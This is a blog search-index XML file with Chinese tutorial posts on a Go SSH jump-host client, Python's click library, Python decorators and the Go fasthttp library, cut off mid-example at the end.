<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[Golang版跳板机开篇-架构与简介]]></title>
      <url>%2F2017%2F02%2F13%2Fgo-ssh%2F</url>
      <content type="text"><![CDATA[第一步摸清ssh, 实现CLI 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 package mainimport ( "log" "os" "golang.org/x/crypto/ssh" "golang.org/x/crypto/ssh/terminal")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() session.Stdout = os.Stdout session.Stderr = os.Stderr session.Stdin = os.Stdin modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; termFD := int(os.Stdin.Fd()) w, h, _ := terminal.GetSize(termFD) termState, _ := terminal.MakeRaw(termFD) defer terminal.Restore(termFD, termState) err = session.RequestPty("xterm-256color", h, w, modes) ce(err, "request pty") err = session.Shell() ce(err, "start shell") err = session.Wait() ce(err, "return")&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python命令行开发神器-click]]></title>
      <url>%2F2017%2F02%2F08%2Fpython-click%2F</url>
      <content type="text"><![CDATA[之前写过一篇博客介绍过如何写漂亮的命令行工具, 不过使用的是golang的cobra库, 整体而言效果和使用体验还是非常不错的, 不过今天看博客时发现了一个更不错的库，而且是Python的: Click,所以用起来应该更得心应手。 之前在开发openstack客户端时, 模仿openstack sdk写过CLI, 他也是对argparse库上做的封装, 但是使用起来也比较复杂, 简单看了下click的文档, 体验还是非常不错的。 简介先说下click的出生, 因为他出生名门: Pocoo, Pocoo是一个团队，Pocoo出品必是精品,比如 Flask, Werkzeug, Jinja 2 , Pygments, Sphinx。冲着pocoo的品牌, 都应该多看一眼click。click是一个用于快速构建命令行的python的第三方模块, 功能强大, 使用简单。我们都知道Python内置的Argparse模块，以前也经常用到, 当时觉得Argparse很不错, 因为没有对比(没有对比就没伤害), 看了下Click马上就觉得Argparse太繁琐了，Click相较于Argparse就好比requests对比urllib。我们看看click官方文档上是怎么说明click的： Click是一个使用最少代码构建漂亮CLI的命令行界面创建工具包, 高度可配置,但是却开箱即用他有3个特点： 支持命令的任意嵌套 支持命令行帮助页面的自动生成 支持子命令运行时惰性加载 快速使用构建CLI有2个要点: 命令和参数, 使用click时，@click.command()用户装饰命令, @click.option()和@click.argument()用于装饰参数, 比如下面就是一个经典的使用形式:12345678910111213import click@click.command()@click.option('--count', default=1, help='Number of greetings.')@click.option('--name', prompt='Your name', help='The person to greet.')def hello(count, name): """Simple program that greets NAME for a total of COUNT times.""" for x in range(count): click.echo('Hello %s!' % name)if __name__ == '__main__': hello() 为了演示他更强大的功能, 我们可以模拟一个docker的命令行。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@volume.command()def create(): """Create a volume""" pass@volume.command()def inspect(): """isplay detailed information on one or more volumes""" pass@volume.command()@click.option('-f', '--filter', type=str, help="Provide filter values (e.g. 'dangling=true')")@click.option('-q', '--quiet', is_flag=True, help='Only display volume names')@click.option('--format', type=str, help='Pretty-print volumes using a Go template')def ls(filter, quiet, format): """List volumes""" print("%s, %s, %s" % (filter, quiet, format))@volume.command()@click.option('-f', '--force', type=str, help='Force the removal of a running container (uses SIGKILL)')@click.option('-l', '--link', type=str, help='Remove the specified link')@click.option('-v', '--volume', type=str, help='Remove the volumes associated with the container')def rm(force, link, volume): """Remove one or more volumes""" print("%s, %s, %s" % (force, link, volume))@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" pass@network.command()def connect(): """Connect a container to a network""" pass@network.command()def ls(): """List networks""" pass@network.command()def rm(): """Remove one or more networks""" passif __name__ == '__main__': docker() 最终效果如下:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859➜ test python3 test.pyUsage: test.py [OPTIONS] COMMAND [ARGS]...Options: --help Show this message and exit.Commands: network Manage networks volume Manage volumes➜ test python3 test.py networkUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: connect Connect a container to a network create Create a network ls List networks rm Remove one or more networks➜ test python3 test.py volumeUsage: test.py volume [OPTIONS] COMMAND [ARGS]... Manage volumesOptions: --help Show this message and exit.Commands: create Create a volume inspect isplay detailed information on one or more... ls List volumes rm Remove one or more volumes➜ test python3 test.py volume ls --helpUsage: test.py volume ls [OPTIONS] List volumesOptions: -f, --filter TEXT Provide filter values (e.g. &apos;dangling=true&apos;) -q, --quiet Only display volume names --format TEXT Pretty-print volumes using a Go template --help Show this message and exit.➜ test python3 test.py volume rm --helpUsage: test.py volume rm [OPTIONS] Remove one or more volumesOptions: -f, --force TEXT Force the removal of a running container (uses SIGKILL) -l, --link TEXT Remove the specified link -v, --volume TEXT Remove the volumes associated with the container --help Show this message and exit. 命令与组这是click中最重要的概念, 我们可以通过command和group装饰器实现一个无限嵌套的命令行工具, 其中command用户装饰命令, group用于将命令分组(类)上面那个模块docker命令行就是分组的使用。123456789101112131415161718192021222324import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" passif __name__ == '__main__': docker() 命令行参数从命令行读取参数值，再将其传递给函数,读取的参数分为两类: 可选参数和必须参数，下面分别做介绍 可选参数使用@click.option装饰器完成可选参数的录入, 通过上面的栗子我们可以发现该装饰器有很多参数前面2个位置参数比如’-f’, ‘–force’用于描述参数名称, type指明参数等，option常用的设置参数如下： default: 设置命令行参数的默认值 help: 参数说明 type: 参数类型，可以是 string, int, float 等 prompt: 当在命令行中没有输入相应的参数时，会根据 prompt 提示用户输入 nargs: 指定命令行参数接收的值的个数我们可以依然这些选项来完成我们很长常用的功能 默认参数经常我们需要为参数设置一些默认值, 使用default指定参数的默认值就能办到, 就这么简单12345678910111213141516171819202122232425import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()@click.option('-n', '--name', type=str, default='flat', help='The network name')def create(name): """Create a network""" click.echo('create network %s success' % name)if __name__ == '__main__': docker() 运行结果:123456789101112➜ test python3 test.py network --helpUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: create Create a network➜ test python3 test.py network createcreate network flat success 选择参数很多情况下, 我们也会给用户一些选择参数, 比如性别就只能选择(M/F), 因此我们应该提示用户输入正确的值,在这种情况下，我们可以通过 click.Choice() 来限定1234567891011@user.command()@click.option('-g', '--gender', type=click.Choice(['male', 'female']), help="The user's gender")@click.help_option('-h', '--help')def create(gender): """Create a user""" if gender is None: raise click.BadOptionUsage("miss gender choice!") click.echo("user's gender is %s" % gender)if __name__ == '__main__': docker() 多值参数有时，一个参数需要接收多个值, 比如我们算一个立方体的体积, 这时候我们就需求通过nargs指定 该参数接收多少个值, 比如123456789@cube.command()@click.option('-p', '--profile', type=int, nargs=3 ,help="The cube Length, width and height")@click.help_option('-h', '--help')def volume(profile): """Compute cube's volume""" if profile is None: raise click.BadOptionUsage("miss profile!") v = profile[0] * profile[1] * profile[2] click.echo("the cube's volume is %s" % v) 密码参数命令行我们常常有输入密码的需求，这个我们应该怎么用喃？123456@user.command()@click.option('-p', '--password', prompt=True, hide_input=True, confirmation_prompt=True)@click.help_option('-h', '--help')def create(password): """Create a user""" click.echo('Encrypting password to %s' % password) 这个看下效果:1234➜ test python3 test.py user createPassword:Repeat for confirmation:Encrypting password to 123 必选参数相较于可选参数的灵活性而言, 必须参数比较简单了。用@click.argument来添加固定参数。 定参这里需要主要位置参数的顺序了。比如3个定参数 x y z1234567@user.command()@click.argument('x')@click.argument('y')@click.argument('z')def create(x, y, z): """Create a user""" click.echo("%s, %s, %s" % (x, y, z)) 12345678910➜ test python3 test.py user create 1Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "y".➜ test python3 test.py user create 1 2Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "z".➜ test python3 test.py user create 1 2 31, 2, 3 不定参参数不定的情况也是常有的, 比如我们想将多个文件移到一个文件里面, src: file1 file2 file3 dir: file4。我们让nargs=-1就可以了, 他表示接收[:-1]的参数1234567@user.command()@click.argument('src', nargs=-1)@click.argument('dst', nargs=1)def create(src, dst): """Create a user""" click.echo("src: %s" % ' '.join(list(src))) click.echo("dst: %s" % dst) 123➜ test python3 test.py user create file1 file2 file3 file4src: file1 file2 file3dst: file4 其他功能click还有比较多的高级功能，比如分页和彩色打印, click文档写得比较好: click官方文档 总结pocoo非常热衷于使用装饰器, 可以说他们对装饰器的使用简直出神入化, 在flask里面就可见一斑, 而前一篇才讲了装饰器, 这个click库里面对装饰器的使用也称得上典范, 源码很值得一读。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python进阶系列-装饰器]]></title>
      <url>%2F2017%2F02%2F05%2Fpython-deractor%2F</url>
      <content type="text"><![CDATA[装饰器是一个非常重要的概念，可能算是进阶的一大门槛。装饰器允许向一个现有的对象添加新的功能，同时又不改变其结构,是一种功能增强的模式。在面向对象(OOP)的设计模式中，decorator被称为装饰模式。OOP的装饰模式需要通过继承和组合来实现，而Python除了能支持OOP的decorator外，直接从语法层次支持decorator。Python的decorator可以用函数实现，也可以用类实现。接下来将全面介绍关于Python装饰器相关的知识。 简介装饰器本质上是一个Python函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。概括的讲，装饰器的作用就是为已经存在的函数或对象添加额外的功能。 引子在Python里，一切皆对象, 函数更是头等对象，函数对象可以被赋值给变量，所以，通过变量也能调用该函数12345678&gt;&gt;&gt; def now():... print('2017-02-02')...&gt;&gt;&gt; f = now&gt;&gt;&gt; f()2017-02-02&gt;&gt;&gt; f.__name__'now' 现在，假设我们要增强now()函数的功能，比如，在函数调用前后自动打印日志，但又不希望修改now()函数的定义,该怎么做喃？最简单的方式就是动态替换now，并保持函数签名不变123456789101112131415def now(): print('2017-02-02')def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrappernow = debug(now)now() 为了方便python在语法层面就已经支持了装饰器(python &gt; 2.4),@语法糖实际上就等于now = debug(now), 因此实际上应该这样写1234567891011121314def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')now() 这个dubug装饰器有个巨大的缺陷: 我们只能装饰不带参数的函数。实际上函数的形式各种各样，如何才能一个装饰器适配各种函数喃？python提供的可变参数可以很好的解决这个问题。12345678910111213141516171819def debug(func): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')@debugdef hello(name): print("hello %s" % name)now()hello("Bob") 如此一个基础的装饰器就写完了，以下将介绍各式各样的装饰器。 函数式装饰器装饰器本身是一个函数 装饰函数被装饰的对象是一个函数, wrapper是对函数的增强 基础-装饰器无参数这是最基础的一种装饰器, 在引子中已经有栗子了。 高级-装饰器有参数带参数的装饰器和类装饰器属于进阶的内容。在理解这些装饰器之前，最好对函数的闭包和装饰器的接口约定有一定了解。关于python中的闭包概念我在下一篇中会单独介绍,这里你只需要知道闭包是一个携带状态的函数即可。实际上就是返回装饰器的一个函数，但是这个装饰器携带外部变量(这就是闭包)12345678910111213141516171819def debug(level='INFO'): def decorator(func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125;()".format(level, func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper return decorator@debug()def now(): print('2017-02-02')@debug("DEBUG")def hello(name): print("hello %s" % name)now()hello("Bob") 装饰类被装饰的对象是一个类,wrapper是对类的增强,所以装饰器的变化并不大,甚至可以沿用 基础-装饰器无参数123456789101112131415161718def debug(cls): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125; class".format(cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name_ return wrapper@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 高级-装饰器有参数1234567891011121314151617181920212223def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 类式装饰器装饰器函数其实是这样一个接口约束，它必须接受一个callable对象作为参数，然后返回一个callable对象。在Python中一般callable对象都是函数，但也有例外。只要某个对象重载了 call () 方法，那么这个对象就是callable的。我们可以让类的构造函数 init () 接受一个函数，然后重载 call () 并返回一个函数，也可以达到装饰器函数的效果。 装饰函数和类被装饰的对象是一个函数或是一个类，其实并没有本质上的差别，因此这里合并给出栗子 装饰器无参数1234567891011121314151617181920class debug(object): def __init__(self, func): self.func = func def __call__(self, *args, **kwargs): print("[DEBUG]: enter function &#123;func&#125;()".format(func=self.func.__name__)) return self.func(*args, **kwargs)@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 装饰器有参数1234567891011121314151617181920212223class debug(object): def __init__(self, level='INFO'): self._level = level def __call__(self, func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter function &#123;&#125;()".format(self._level ,func.__name__)) return func(*args, **kwargs) return wrapper@debug()class Hello(object): def __init__(self, name): self.name = name@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") 内置装饰器内置的装饰器和普通的装饰器原理是一样的，只不过返回的不是函数，而是类对象，所以更难理解一些 propert我们先看看property到底是啥,以下是property类的doc string123456789101112131415161718192021222324252627282930313233class property(object): """ property(fget=None, fset=None, fdel=None, doc=None) -&gt; property attribute fget is a function to be used for getting an attribute value, and likewise fset is a function for setting, and fdel a function for del'ing, an attribute. Typical use is to define a managed attribute x: class C(object): def getx(self): return self._x def setx(self, value): self._x = value def delx(self): del self._x x = property(getx, setx, delx, "I'm the 'x' property.") Decorators make defining new properties or modifying existing ones easy: class C(object): @property def x(self): "I am the 'x' property." return self._x @x.setter def x(self, value): self._x = value @x.deleter def x(self): del self._x """ def __init__(self, fget=None, fset=None, fdel=None, doc=None): # known special case of property.__init__ pass ... 实际上property装饰器帮我们完成了x = property(getx, setx, delx, &quot;I&#39;m the &#39;x&#39; property.&quot;)这个动作，而且返回的是一个property对象。 staticmethodstaticmethod传入一个函数返回一个staticmethod的对象。123456789101112131415161718192021222324class staticmethod(object): """ staticmethod(function) -&gt; method Convert a function to be a static method. A static method does not receive an implicit first argument. To declare a static method, use this idiom: class C: def f(arg1, arg2, ...): ... f = staticmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. Static methods in Python are similar to those found in Java or C++. For a more advanced concept, see the classmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... classmethod同理classmethod传入一个函数返回一个classmethod对象。123456789101112131415161718192021222324252627class classmethod(object): """ classmethod(function) -&gt; method Convert a function to be a class method. A class method receives the class as implicit first argument, just like an instance method receives the instance. To declare a class method, use this idiom: class C: def f(cls, arg1, arg2, ...): ... f = classmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. If a class method is called for a derived class, the derived class object is passed as the implied first argument. Class methods are different than C++ or Java static methods. If you want those, see the staticmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... 需要注意的问题装饰器可以让你代码更加优雅，减少重复，但也不全是优点，也会带来一些问题。 位置错误1234567891011121314151617181920212223def html_tags(tag_name): print('begin outer function.') def wrapper(func): print("begin of inner wrapper function.") def wrapper(*args, **kwargs): content = func(*args, **kwargs) print("&lt;&#123;tag&#125;&gt;&#123;content&#125;&lt;/&#123;tag&#125;&gt;".format(tag=tag_name, content=content)) print('end of inner wrapper function.') return wrapper print('end of outer function') return wrapper@html_tags('b')def hello(name='Toby'): return 'Hello &#123;&#125;!'.format(name)hello()hello() 在装饰器中我在各个可能的位置都加上了 print 语句，用于记录被调用的情况。你知道他们最后打印出来的顺序吗？如果你心里没底，那么最好不要在装饰器函数之外添加逻辑功能，否则这个装饰器就不受你控制了1234567begin outer function.end of outer functionbegin of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function. 函数签名和文档使用装饰器后实际上函数的前面和文档都会被替换成wrapper的，虽然我们可以简单处理过来,但是这并不是完美的解决之道123456789101112131415161718192021222324252627282930import inspectdef debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob")print(Hello.__name__)print(hello.__name__)print(inspect.getsource(Hello))print(inspect.getsource(hello)) staticmethod和classmethod不能再次装饰当你想把装饰器用在一个静态方法或者类方法时，不好意思，报错了。12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug # 装饰实例方法，OK def run(self): print("&#123;&#125; is running!".format(self.model)) @debug # 装饰静态方法，Failed @staticmethod def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) 前面已经解释了@staticmethod这个装饰器，其实它返回的并不是一个callable对象，而是一个staticmethod对象，那么它是不符合装饰器要求的（比如传入一个callable对象），你自然不能在它之上再加别的装饰器。要解决这个问题很简单，只要把你的装饰器放在@staticmethod之前就好了，因为你的装饰器返回的还是一个正常的函数，然后再加上一个@staticmethod是不会出问题的。12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug() # 装饰实例方法，OK def run(self): print("&#123;&#125; is running!".format(self.model)) @staticmethod @debug() # 静态装饰器放到最后就ok了 def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) 利用第三方库来写装饰器嵌套的装饰函数不太直观，我们可以使用第三方包类改进这样的情况，让装饰器函数可读性更好。 decoratordecorator.py是一个非常简单的装饰器加强包。你可以很直观的先定义包装函数wrapper() ，再使用decorate(func, wrapper)方法就可以完成一个装饰器。1234567891011121314151617181920@decoratordef debug(func, *args, **kwargs): print("[DEBUG] &#123;&#125;: enter &#123;&#125;()".format(datetime.now(), func.__name__)) return func(*args, **kwargs)@debugdef hello(name): """test""" print("hello %s" % name)@debugclass Hello(object): def __init__(self, name): self.name = namehello("Bob")print(inspect.getsource(hello))print(hello.__name__) decorator比较简陋, 要装饰类和带参数的装饰就不能很好支持了。 wraptwrapt是一个功能非常完善的包，用于实现各种你想到或者你没想到的装饰器。使用 wrapt 实现的装饰器你不需要担心之前 inspect 中遇到的所有问题，因为它都帮你处理了，甚至 inspect.getsource ( func ) 也准确无误更全面的文档可以参考wrapt官方文档123456789101112131415161718192021222324252627282930313233343536373839404142434445from datetime import datetimeimport wraptdef debug(level='INFO'): @wrapt.decorator def wrapper(wrapped, instance, args, kwargs): print("[&#123;&#125;]: &#123;&#125; message".format(level, datetime.now())) return wrapped(*args, **kwargs) return wrapperclass Class(object): @debug() def function_im(self, arg1, arg2): pass @debug("DEBUG") @classmethod def function_cm(cls, arg1, arg2): pass @debug("ERROR") @staticmethod def function_sm(arg1, arg2): pass@debug()class Hello(): def __init__(self, name): self.name = name@debug()def hello(name): print("hello %s" % name)c = Class()c.function_im(1, 2)Class.function_im(c, 1, 2)Class.function_cm(1, 2)Class.function_sm(1, 2)h = Hello("Bob")hello("Bob") 总结装饰器的理念是对原函数、对象的加强，相当于重新封装，所以一般装饰器函数都被命名为wrapper() ，意义在于包装。函数只有在被调用时才会发挥其作用。比如@debug 装饰器可以在函数执行时额外输出日志， @cache装饰过的函数可以缓存计算结果等等。最后避免重复造轮子推荐使用wrapt，除非wrapt真不能满足你的特性需求。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[高性能web之fasthttp]]></title>
      <url>%2F2017%2F01%2F25%2Ffasthttp%2F</url>
      <content type="text"><![CDATA[浏览网上博客时发现了这么一篇测试文章nginx vs iris, 结果是iris越胜一筹, 而Iris底层使用的并不是Golang的HTTP的标准库, 而是使用的第三方库fasthttp, 之前读过一点关于golang的net/http, 在处理用户的请求时的确有点粗暴, 直接一个连接一个goroutine, 完全没有并发的控制。按捺不做内心的好奇, 想感受一把fasthttp, 来一起走进fasthttp的世界看看。 Benchmark的的胜出github上面有一个好事者写了一个Go Web框架性能的压测工具, 结果是fasthttp表现非常优异, 具体请查看go-web-framework-benchmark github地址请允许我贴一张他的图 简介fasthttp是Go的HTTP的第三方实现, 它宣称比标准库net/http快10倍, 是一款高性能的HTTP实现。Github中的Fasthttp best practices这段描述了它为啥高性能的原因 net/http 的实现是一个连接新建一个 goroutine; fasthttp是利用一个 worker 复用 goroutine，减轻 runtime 调度 goroutine 的压力 net/http 解析的请求数据很多放在 map[string]string (http.Header) 或 map[string][]string (http.Request.Form)，有不必要的 []byte 到 string 的转换，是可以规避的 net/http 解析 HTTP 请求每次生成新的 http.Request 和 http.ResponseWriter; fasthttp解析 HTTP 数据到 fasthttp.RequestCtx ，然后使用 sync.Pool复用结构实例，减少对象的数量 fasthttp会延迟解析 HTTP 请求中的数据，尤其是 Body 部分。这样节省了很多不直接操作 Body 的情况的消耗 但是因为fasthttp的实现与标准库差距较大，所以API的设计完全不同, 因此也不兼容标准库net/http。使用时既需要理解HTTP的处理过程，又需要注意和标准库的差别。 基本使用基本用法很简单, 1. 写好handler 2. 监听交给handler处理.12345678910111213141516171819package mainimport ( "fmt" "github.com/valyala/fasthttp")// 使用RequestCtx传递HTTP的数据func httpHandler(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "hello fasthttp")&#125;// 启动服务时指定处理任务的handlerfunc main() &#123; if err := fasthttp.ListenAndServe("0.0.0.0:8080", httpHandler); err != nil &#123; fmt.Println("start fasthttp fail:", err.Error()) &#125;&#125; 路由net/http提供http.ServeMux实现路由服务，但是匹配规则简陋，功能很简单，基本不会使用。 fasthttp吸取教训，默认没有提供路由支持。官方提到了4个路由实现: Iris, fasthttp-routing, fasthttproute, lu, 第一个是框架, 第二三个是单纯的路由, 第4个不知道。我这里选择fasthttprouter, 因为github上面这个项目文档和活跃度比较不错 安装fasthttprouter12345678➜ Blogs go get -u -v &quot;github.com/buaazp/fasthttprouter&quot;github.com/buaazp/fasthttprouter (download)github.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)github.com/buaazp/fasthttprouter 简单使用详尽的使用还得去看Github或者源码, 请允许我贴一段官方的代码, 我本地也用着这个测12345678910111213141516171819202122232425package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Index(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "Welcome!\n")&#125;func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; 请求和响应在fasthttp中使用一个对象来维护请求的上下文:RequestCtx, 它综合了http.Request和http.ResponseWriter的操作，可以更方便的读取和返回数据, 通过下图这种对照表我们可以清晰的看出来12345678910111213141516171819202122232425262728293031r.Body -&gt; ctx.PostBody()r.URL.Path -&gt; ctx.Path()r.URL -&gt; ctx.URI()r.Method -&gt; ctx.Method()r.Header -&gt; ctx.Request.Headerr.Header.Get() -&gt; ctx.Request.Header.Peek()r.Host -&gt; ctx.Host()r.Form -&gt; ctx.QueryArgs() + ctx.PostArgs()r.PostForm -&gt; ctx.PostArgs()r.FormValue() -&gt; ctx.FormValue()r.FormFile() -&gt; ctx.FormFile()r.MultipartForm -&gt; ctx.MultipartForm()r.RemoteAddr -&gt; ctx.RemoteAddr()r.RequestURI -&gt; ctx.RequestURI()r.TLS -&gt; ctx.IsTLS()r.Cookie() -&gt; ctx.Request.Header.Cookie()r.Referer() -&gt; ctx.Referer()r.UserAgent() -&gt; ctx.UserAgent()w.Header() -&gt; ctx.Response.Headerw.Header().Set() -&gt; ctx.Response.Header.Set()w.Header().Set(&quot;Content-Type&quot;) -&gt; ctx.SetContentType()w.Header().Set(&quot;Set-Cookie&quot;) -&gt; ctx.Response.Header.SetCookie()w.Write() -&gt; ctx.Write(), ctx.SetBody(), ctx.SetBodyStream(), ctx.SetBodyStreamWriter()w.WriteHeader() -&gt; ctx.SetStatusCode()w.(http.Hijacker).Hijack() -&gt; ctx.Hijack()http.Error() -&gt; ctx.Error()http.FileServer() -&gt; fasthttp.FSHandler(), fasthttp.FShttp.ServeFile() -&gt; fasthttp.ServeFile()http.Redirect() -&gt; ctx.Redirect()http.NotFound() -&gt; ctx.NotFound()http.StripPrefix() -&gt; fasthttp.PathRewriteFunc 下面是一个简单例子，在上下文中获取请求数据, 通过WriteString来返回响应。1234567891011121314151617181920212223242526272829303132333435363738package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.WriteString("hello,fasthttp") // 因为实现不同，fasthttp 的返回内容不是即刻返回的 // 不同于标准库，添加返回内容后设置状态码，也是有效的 ctx.SetStatusCode(404) // 返回的内容也是可以获取的，不需要标准库的用法，需要自己扩展 http.ResponseWriter fmt.Printf("Host: %s\n", ctx.Host()) fmt.Printf("Body: %s\n", ctx.Response.Body()) fmt.Printf("Path: %s\n", ctx.Path()) fmt.Printf("Method: %s\n", ctx.Method()) fmt.Printf("URI: %s\n", ctx.URI()) fmt.Printf("Connect Time: %s\n", ctx.ConnTime()) fmt.Printf("UserAgent: %s\n", ctx.UserAgent())&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; Body处理fasthttp 提供比标准库丰富的 Body 操作 API，而且支持解析 Gzip 过的数据, 我们可以简单的使用上下文的PostBody方法获取body1234567891011121314151617181920212223242526272829303132package mainimport ( "encoding/json" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; body := ctx.PostBody() // 获取到的是 []byte fmt.Fprintf(ctx, "Body:%s", body) // 因为是 []byte，解析 JSON 很简单 var v interface&#123;&#125; json.Unmarshal(body, &amp;v) fmt.Printf("%v", v)&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; 简单的测试结果12➜ Blogs curl -X POST -d &apos;&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125;&apos; http://127.0.0.1:8080/Body:&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125; 表单处理RequestCtx有同标准库的 FormValue() 方法，还对 GET 和 POST/PUT 传递的参数进行了区分1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "bytes" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.SetContentType("text/html") // GET ?abc=abc&amp;abc=123 getValues := ctx.QueryArgs() fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", getValues.Peek("abc")) // Peek 只获取第一个值 fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", bytes.Join(getValues.PeekMulti("abc"), []byte(","))) // PeekMulti 获取所有值 // POST xyz=xyz&amp;xyz=123 postValues := ctx.PostArgs() fmt.Fprintf(ctx, 